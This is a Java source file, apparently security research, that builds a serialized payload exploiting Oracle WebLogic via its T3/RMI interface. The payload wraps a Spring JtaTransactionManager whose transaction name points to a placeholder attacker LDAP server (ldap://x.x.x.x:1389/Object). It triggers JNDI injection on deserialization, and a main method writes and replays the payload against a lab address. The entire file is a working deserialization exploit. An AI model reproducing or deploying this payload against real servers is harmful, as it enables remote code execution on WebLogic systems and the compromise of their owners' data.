package com.longofo.weblogicrmi;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.*;
import java.util.Hashtable;

public class Payload implements Serializable {
    /**
     * 尝试调用远程接口不存在的方法
     */
    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";

    private void writeObject(ObjectOutputStream out) throws IOException {
        String jndiAddress = "ldap://x.x.x.x:1389/Object";
        //实例化JtaTransactionManager 对象，并且初始化UserTransactionName成员变量
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName(jndiAddress);

        out.writeObject(jtaTransactionManager);
        out.writeObject(jtaTransactionManager);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, NamingException {
        InitialContext initialContext = getInitialContext("t3://192.168.192.135:7001");
        IHello iHello = (IHello) initialContext.lookup("HelloServer");
        iHello.readObject(in);
    }

    private InitialContext getInitialContext(String url) throws NamingException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Payload replace = new Payload();
        File f = new File("payload.ser");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(replace);
        out.flush();
        out.close();

        File f1 = new File("payload.ser");
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(f1));
        in.readObject();
        in.close();
    }
}
